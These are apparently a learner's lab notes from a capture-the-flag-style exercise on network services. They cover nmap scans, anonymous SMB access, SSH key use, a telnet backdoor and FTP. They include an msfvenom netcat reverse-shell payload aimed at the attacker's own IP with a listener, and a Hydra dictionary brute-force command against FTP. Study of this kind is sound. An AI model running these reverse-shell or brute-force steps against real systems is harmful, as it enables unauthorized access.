### impooos
 - grep "ftp-anon" /usr/share/nmap/scripts/script.db  

 good tcp aggressive scan and saving the file on current dir named : nmapthm
 
- └─$ sudo nmap -p- -A -T5 -sT 10.10.212.180  -oN nmapthm

also this works fine and simple using syn scan

- nmap -vv  -T5 -oN NmapScan -p- 10.10.147.81

after getting open ports you need to scan specific port like this in order to focus on it

	sudo nmap -A -T4 -vv -p 8012 -oN NmapPortScan 10.10.147.81

Explanation of Changes:

- Removed `-sT`: It's unnecessary unless a full TCP connect scan is specifically needed.
- Removed `-sC`: It's included in `-A`.
- Adjusted `-T5` to `-T4`: `-T4` is fast but more reliable and less likely to cause issues with firewalls.


did an nmap scan 

found one open port now focus on it

**import**
	PORT     STATE SERVICE REASON  VERSION
	8012/tcp open  unknown syn-ack
	| fingerprint-strings: 
	|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
	|_    SKIDY'S BACKDOOR. Type .HELP to view commands


that scan says that this can be used ass a backdoor .   SKIDY'S BACKDOOR.


this  opens the txt file in SMB server !

smb: \>  more "Working From Home Information.txt" 


know that important file  in ssh is 
id_rsa

user could be found in public id rsa 
![[Pasted image 20250107204606.png]]
##  **Understanding SMB (Server Message Block Protocol)**

- **Definition**: A client-server communication protocol used for sharing access to files, printers, serial ports, and other resources over a network.
- **How It Works**:
    - Servers make file systems and resources (e.g., printers, named pipes) available to clients.
    - Clients connect to servers using protocols like TCP/IP (NetBIOS over TCP/IP), NetBEUI, or IPX/SPX.
    - Once connected, clients send commands (SMBs) to access shares, open files, read/write files, and perform file system operations over the network.
- **Key Features**:
    - **==Response-Request Protocol==**: Transmits multiple messages between client and server to establish a connection.
    - **Cross-Platform Support**:
        - **Windows**: Native support since Windows 95 (both client and server).
        - **Unix/Linux**: Supported via **Samba**, an open-source SMB implementation.



## Enumerating SMB


- **Purpose**: Enumerates SMB shares on Windows/Linux systems.
- **Function**: Wrapper for Samba tools to extract SMB information easily.
- **Availability**: Pre-installed on AttackBox; installable from GitHub.

### Syntax:

```bash
enum4linux [options] ip
```

### Common Tags and Functions:

- **-U**: Get user list
- **-M**: Get machine list
- **-N**: Get namelist dump (different from -U and -M)
- **-S**: Get share list
- **-P**: Get password policy info
- **-G**: Get group and member list
- **-a**: Full enumeration (all options above)


## Exploiting SMB



- **Common Exploit**: Misconfigured SMB shares (e.g., anonymous SMB access) rather than vulnerabilities like[CVE-2017-7494](https://www.cvedetails.com/cve/CVE-2017-7494/).
- **Goal**: Gain information from SMB share misconfigurations to access a shell.

### Method Breakdown:

- **From Enumeration**:
    - Know the **SMB share location**
    - Know the **name of an interesting SMB share**

### SMBClient

- **Purpose**: Access SMB shares remotely.
- **Availability**: Part of the Samba suite (pre-installed on AttackBox; installable via documentation).

### Syntax:

```bash
smbclient //[IP]/[SHARE] -U [name] -p [port]
```

- **-U [name]**: Specify the username
- **-p [port]**: Specify the port

smbclient //10.10.212.180/profiles -U anonymous    
Password for [WORKGROUP\anonymous]:
Try "help" to get a list of possible commands.
smb: \> 


![[Pasted image 20250107194647.png]]

used  to read whts in the file and found the user name
more "Working From Home Information.txt"


This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?

id_rsa

found the user name on 
id_rsa.pub (public key)

then logged in.

![[Pasted image 20250107204913.png]]

## Telnet

- **What is Telnet?**
    
    - An ==application protocol== that allows connecting to a remote machine to execute commands.
    - The **Telnet client** connects to the server, acting as a virtual terminal for interacting with the remote host.
- **Replacement**:
    
    - Telnet sends data in **clear text** and lacks security mechanisms.
    - **SSH** (Secure Shell) is commonly used as a more secure replacement.
    - ![[Pasted image 20250107211208.png]]
- **How Telnet Works**:
    
    - Use the command: `telnet [ip] [port]`
    - The user connects to the server and can execute commands using **Telnet commands** in the Telnet prompt.

### Telnet Exploit Summary

###### **Why Telnet is Vulnerable**:

- **Insecure Protocol**: Lacks encryption, sends data in plaintext, and often has poor access control.
- **CVE Vulnerabilities**: Check for Telnet-related CVEs at:
    - [CVE Details](https://www.cvedetails.com/)
    - [CVE Mitre](https://cve.mitre.org/)
- **Misconfigurations**: Exploits often result from poor Telnet setup rather than protocol flaws.

---

###### **Method Breakdown**:

1. **From Enumeration**:
    
    - **Telnet service**: Poorly hidden and marked as "backdoor."
    - **Possible username**: "Skidy" identified.
2. **Goal**: Use Telnet to gain a foothold, then escalate to a **reverse shell**.
    

---

###### **Connecting to Telnet**:

- Command:
    
    ```bash
    telnet [ip] [port]
    ```
    

---

#### **What is a Reverse Shell?**
![[Pasted image 20250107220259.png]]

- **Definition**: A shell that allows the target machine to connect back to the attacker's machine.
- **How it Works**:
    - **Attacking Machine**: Listens on a port for incoming connections.
    - **Target Machine**: Establishes the connection, enabling command/code execution.


##### Using telnet and tcpdump listening 

connect to telnet :

└─$ telnet   10.10.147.81   8012
 


This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on

- `sudo tcpdump ip proto \\icmp -i tun0`


only the last one had run correctly 
![[Pasted image 20250107221447.png]]



![[Pasted image 20250107221505.png]]
##### using msfvenom

We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:  

**"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"**

-p = payload

lhost = our local host IP address (this is **your** machine's IP address)

lport = the port to listen on (this is the port on **your** machine)

R = export the payload in raw format


this did not work , how i fixed it :

ip a 

gets the ip the put it directly in lhost

└─$ msfvenom -p cmd/unix/reverse_netcat LHOST=10.21.117.138 lport=4444 R

Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:

**"nc -lvnp [listening port]"**


Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!

![[Pasted image 20250107223617.png]]


![[Pasted image 20250107223636.png]]

cat flag.txt

found the flag.


## FTP

**Definition**:  
FTP is a protocol used for transferring files between computers over a network. It works on a ==client-server== model, where a client sends commands and the server responds, transferring files as requested.

---

### **How FTP Works**:

- **Two Channels**:
    
    1. **Command (Control) Channel**: Used for sending commands and receiving responses.
    2. **Data Channel**: Used for transferring the actual data (files).
- **Client-Server Interaction**:
    
    - The **client** initiates a connection to the **server** and provides login credentials.
    - After validation, the session is opened and the client can issue commands to the server.

---

### **Active vs. Passive FTP**:

- **Active FTP**:
    
    - The **client** opens a port and listens.
    - The **server** actively connects to the client's open port to transfer data.
- **Passive FTP**:
    
    - The **server** opens a port and listens.
    - The **client** connects to the server's open port for data transfer.

The distinction allows for more efficient transfers, especially in situations involving firewalls or NAT (Network Address Translation).

---

For further technical details, refer to the official **RFC 959** document:  
[FTP RFC - IETF](https://www.ietf.org/rfc/rfc959.txt).

![[Pasted image 20250107230536.png]]



###### **Types of FTP Exploits**

FTP, like Telnet, is vulnerable due to the fact that both the **command** and **data channels** transmit data in **plaintext**. This can allow attackers to intercept sensitive information, such as passwords, especially if a **man-in-the-middle (MITM)** attack occurs.

**Key FTP Exploit:**

- **Man-in-the-Middle (MITM) Attack**: Since FTP data is unencrypted, an attacker could use techniques like **ARP Poisoning** to intercept sensitive data (including passwords) sent during the FTP session.

**FTP Server Misconfiguration:**

- One common exploit is when FTP servers use **weak or default passwords**, which attackers can exploit through **brute-force** attacks.

---

###### **Method Breakdown for Brute-Forcing FTP Passwords**

From the information gathered during enumeration, we know that:

- An **FTP server** is running.
- We have a **possible username**.

With this, we can try to brute-force the FTP password using tools like **Hydra**.

---

###### **Hydra Tool for FTP Brute-Forcing**

**Hydra** is a powerful password-cracking tool that supports **over 50 protocols**, including FTP. It can perform rapid **dictionary attacks** on various services.

**Command Syntax for Hydra:**

```bash
hydra -t 4 -l [username] -P [path to wordlist] -vV [target IP] ftp
```

###### **Breaking Down the Command**:

|**Section**|**Function**|
|---|---|
|`hydra`|Executes the Hydra tool|
|`-t 4`|Specifies **4 parallel connections** for faster cracking|
|`-l [user]`|Specifies the **username** for the account being targeted (e.g., "dale")|
|`-P [path to wordlist]`|Specifies the path to a **wordlist** of potential passwords (e.g., "rockyou.txt")|
|`-vV`|Enables **verbose mode**, showing login attempts and results|
|`[target IP]`|The **IP address** of the target machine|
|`ftp`|Specifies the **FTP protocol** for Hydra to attack|

---

###### **Example Command**:

```bash
hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
```

This command will attempt to crack the FTP password for the user **dale** on the server at **10.10.10.6**, using the **rockyou.txt** wordlist.

---
